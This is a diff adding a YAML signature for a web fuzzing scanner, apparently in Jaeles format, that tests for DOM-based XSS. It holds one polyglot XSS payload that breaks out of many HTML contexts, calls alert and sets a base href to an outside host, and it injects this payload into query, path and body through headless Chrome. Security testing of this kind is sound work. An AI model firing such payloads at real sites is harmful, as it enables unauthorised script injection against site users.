@@ -1,0 +1,33 @@
+# info to search signature
+id: fuzz-DOM-XSS
+type: fuzz
+info:
+  name: DOM Based XSS
+  risk: High
+  author: "@GochaOqradze", @BRuteLogic, @RodoAssis
+
+# origin: gonna come from Burp
+variables:
+    - prefix : |  
+        #
+payloads:
+
+    - JavaScript://%250Aalert?.(1)//\'/*\\'/*\\/*\"/*\\\"/*\`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->
+      
+    
+requests:
+  #- method: GET
+  - engine: chrome
+    redirect: true
+    generators:
+      #Change exist content type or adding new one
+      #- Query("[[.original]]{{.payload}}")
+      - Query("{{.payload}}")
+      - Path("[[.original]]{{.payload}}", "last")
+      - Path("[[.original]]{{.prefix}}{{.payload}}", "last")
+      - Body ("{{.payload}}", "*")     
+    detections:
+      - >-
+        HasPopUp()
+        
+
